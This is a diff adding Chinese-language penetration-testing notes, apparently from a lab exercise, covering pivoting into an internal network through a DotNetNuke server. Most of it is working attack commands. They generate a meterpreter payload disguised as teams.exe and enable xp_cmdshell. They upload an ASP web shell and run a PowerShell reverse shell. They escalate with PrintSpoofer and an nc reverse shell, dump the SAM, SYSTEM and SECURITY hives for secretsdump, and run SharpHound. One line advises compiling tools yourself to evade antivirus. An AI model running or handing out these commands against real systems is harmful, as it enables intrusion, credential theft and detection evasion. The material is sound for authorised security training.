@@ -307,4 +307,54 @@ proxychains crackmapexec smb 172.16.8.20 --local-auth -u administrator -H <redac
 还有其他方法可以检索凭据，例如 Mimikatz
 
 反向端口转发
+msfvenom -p windows/x64/meterpreter/reverse_https lhost=172.16.8.120 -f exe -o teams.exe LPORT=443      生成 pl
+use multi/handler
+set payload windows/x64/meterpreter/reverse_https
+set lhost 0.0.0.0
+set lport 7000
+run
+scp 或 http 服务器或 DNN 上传到跳板机
+ssh -i dmz01_key -R 172.16.8.120:443:0.0.0.0:7000 root@10.129.203.111 -vN      -R 枢纽机在 443 端口上监听，将所有进入此端口的流量转发到攻击机上配置的 Metasploit 监听器 0.0.0.0:7000
+枢纽机执行 teams.exe
+  默认情况下，OpenSSH 只允许从本身连接到远程转发的端口
+  须在枢纽机编辑 /etc/ssh/sshd_config 文件
+  并将 GatewayPorts no 这一行更改为 GatewayPorts yes
+  需要对用作枢纽的主机拥有 root SSH 访问权限
+  如果我们没有 root 权限来临时修改 SSH 配置文件（并使用 service sshd reload 重新加载以使其生效）
+  将无法以这种方式执行端口转发
+  这种类型的更改会在客户的系统中打开一个安全漏洞
+  需要沟通与恢复
+  https://www.ssh.com/academy/ssh/tunneling-example
 
+在攻击机上的 firefox 使用隧道
+sudo ssh -D 9050 -i id_rsa root@10.129.203.114      设置代理隧道
+在 firefox 设置代理 127.0.0.1:9050
+proxychains firefox 172.16.8.20      隧道访问目标
+使用 DNN 的 SQL console
+EXEC sp_configure 'show advanced options', '1'            启动 xp_cmdshell
+RECONFIGURE
+EXEC sp_configure 'xp_cmdshell', '1' 
+RECONFIGURE
+在 DNN 的 security，允许 asp,aspx,exe,SAVE， by editing "Allowable File Extensions"
+通过 DNN 上传一个 newcmdasp.asp 的 shell pl
+root@dmz01:~# nc -nvlp 9999
+root@dmz01:~# ip a show ens192 | grep "inet" -m 1      查看内网网卡
+在浏览器点击使用 web shell 输入
+  powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('172.16.8.120',9999);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte =([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+从攻击机通过 DNN 上传下面的 pl
+wget https://github.com/int0x33/nc.exe/raw/master/nc.exe
+wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
+root@dmz01:~# nc -nvlp 8888
+C:\windows\system32\inetsrv> c:\DotNetNuke\Portals\0\PrintSpoofer64.exe -c "c:\DotNetNuke\Portals\0\nc.exe 172.16.8.120 8888 -e cmd"
+cd c:\dotnetnuke\portals\0\
+reg save HKLM\SYSTEM SYSTEM.SAVE
+reg save HKLM\SECURITY SECURITY.SAVE
+reg save HKLM\SAM SAM.SAVE
+通过 DNN 下载上面3个 SAVE 到攻击机
+secretsdump.py LOCAL -system ~/Downloads/SYSTEM.SAVE -sam ~/Downloads/SAM.SAVE -security ~/Downloads/SECURITY.SAVE
+
+使用 SharpHound 收集器来枚举所有 AD 对象
+将数据导入 BloodHound 图形用户界面 (GUI) 进行审查
+可以下载该可执行文件（但最好自己编译工具，绕过查杀）
+使用 DNN 文件管理器上传
+c:\DotNetNuke\Portals\0> SharpHound.exe -c All
